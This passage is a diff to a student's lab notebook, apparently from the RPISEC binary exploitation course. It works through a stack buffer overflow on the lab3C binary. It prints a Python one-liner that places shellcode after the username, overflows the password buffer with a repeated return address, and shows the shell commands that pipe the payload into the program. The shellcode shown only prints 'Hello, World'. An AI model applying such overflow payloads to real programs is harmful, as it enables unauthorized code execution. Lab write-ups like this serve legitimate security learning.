@@ -18,9 +18,41 @@ A few things I noticed:
 * The username is a global variable
 * The password doesn't matter, it will always fail
 * The password is passed in as a pointer
+* I believe we use one variable for the address and another for the code?
+* The buffer for the fgets were bigger than the buffer set up for the strings. 
+
+![alt text](http://intmain.in/images/lab3c2.png)
+![alt text](http://intmain.in/images/lab3c1.png)
 
 I noticed that this program uses fgets so I read the man page and it takes a stream. This means that I can create a shell code in a file and feed it to the program. ... I think
 
+**Cont 04/24/2018**
+
+I got help from David (other David) for this one. I was on the right track (kinda). So we need to use one variable for the address and one variable for the shellcode. For the username I knew immediatly that I needed to put the username and then the shell code. I also immediatly realized that when I call this location that I will need to move my pointer to a location after the username. 
+
+Then I needed to get the address of the username. Using Radare2 I found it. I then filled the password buffer until it was full and then repeated this address multiple times so that I wouldn't have to worry about exactly finding EIP. This won't always work but it is a good try because it worked!
+
+```
+python -c 'print "rpisec\xEB\x15\x31\xC0\x31\xDB\x31\xD2\xB0\x04\xB3\x01\x59\xB2\x0D\xCD\x80\xB0\x01\x31\xDB\xCD\x80\xE8\xE6\xFF\xFF\xFF\x48\x65\x6C\
+x6C\x6F\x2C\x20\x57\x6F\x72\x6C\x64"
+print "admin" + "A"*63 + "\x40\x9c\x04\x08\x40\x9c\x04\x08\x40\x9c\x04\x08\x40\x9c\x04\x08\x40\x9c\x04\x08\x40\x9c\x04\x08" '
+```
+
+In order to get this to work David showed me the commands needed:
+
+To make the file readable as txt BUT hold my correct hex I needed to use this:
+
+```
+sudo bash lab3C.sh > magic
+```
+
+To run the program correctly with the file piped in (Also allowing the file to stay open so that we can see the script that is run):
+
+```
+sudo cat magic - | ./lab3C
+```
+
+![alt text](http://intmain.in/images/lab3c3.png)
 
 ##### 04/16/2018 
 
